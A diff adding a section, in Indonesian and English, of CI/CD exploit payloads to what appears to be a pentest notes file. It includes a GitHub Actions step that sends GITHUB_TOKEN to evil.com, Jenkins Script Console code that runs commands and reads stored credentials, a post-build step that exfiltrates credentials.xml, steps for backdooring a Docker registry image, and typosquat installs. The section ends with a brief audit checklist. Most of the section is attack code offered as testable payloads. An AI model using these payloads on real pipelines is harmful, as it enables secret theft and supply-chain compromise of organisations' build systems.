@@ -103,3 +103,79 @@ Evasion: Delete PR → no trace (if admin not fast)
 - Jenkins CVE-2024-23897 — https://www.jenkins.io/security/advisory/2024-01-24/
 - SLSA — https://slsa.dev/
 - CI/CD Framework — https://www.legitsecurity.com/
+
+## Konkret — CI/CD Exploit Payload (Testable)
+
+### GitHub Actions — token theft
+
+```yaml
+# 1. Malicious action di workflow (third-party untrusted)
+# .github/workflows/deploy.yml
+steps:
+  - name: Build
+    run: |
+      # Instal dependency berbahaya → exfil GITHUB_TOKEN
+      echo "$GITHUB_TOKEN" | base64 > /tmp/t.txt
+      curl -X POST https://evil.com/exfil -d @/tmp/t.txt
+
+# 2. Pull request trigger → PR dari fork
+# GITHUB_TOKEN punya write → injeksi ke main branch
+on: pull_request_target
+# PERINGATAN: PR target runs dengan full token!
+```
+
+### Jenkins — Credential Thief
+
+```bash
+# 1. Jenkins Script Console (admin) → RCE
+groovy:
+def proc = "id".execute()
+println proc.text
+
+# 2. Read credentials (if user punya access)
+def creds = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(
+    com.cloudbees.plugins.credentials.common.StandardUsernameCredentials.class,
+    Jenkins.instance, null, null)
+
+# 3. Job config modify → inject step
+# Post-build action:
+sh 'curl -X POST https://evil.com/exfil -d @/var/lib/jenkins/credentials.xml'
+```
+
+### Docker Registry — Image Backdoor
+
+```bash
+# 1. Registry exposed (port 5000) → API tanpa auth
+curl http://registry:5000/v2/_catalog
+# 2. Pull image
+docker pull localhost:5000/app:latest
+# 3. Inject backdoor
+docker run -it localhost:5000/app:latest sh
+# tambah shell ke image
+docker commit <container> localhost:5000/app:backdoor
+docker push localhost:5000/app:backdoor
+# 4. Deploy job pull backdoor → all future deployments compromised
+```
+
+### Artifact Poisoning (Dependency)
+
+```bash
+# 1. Dependabot / package registry mirror
+# Typosquat: nama package mirip (loug4j vs log4j)
+npm install log4js-evil  # tapi package asli: log4js
+# 2. Publish malicious package ke public registry (npm/pypi)
+pip install requests-evil  # typosquat dari requests
+# 3. Supply chain RCE di CI runner
+```
+
+### Checklist CI/CD
+
+1. GitHub Actions — check third-party actions, pull_request_target
+2. Jenkins — script console, credential store post-build
+3. Registry — unauth push/pull
+4. Env var — SECRETS di job logs/artifacts
+5. Supply chain — dependency lock file audit
+---
+
+audited
+---
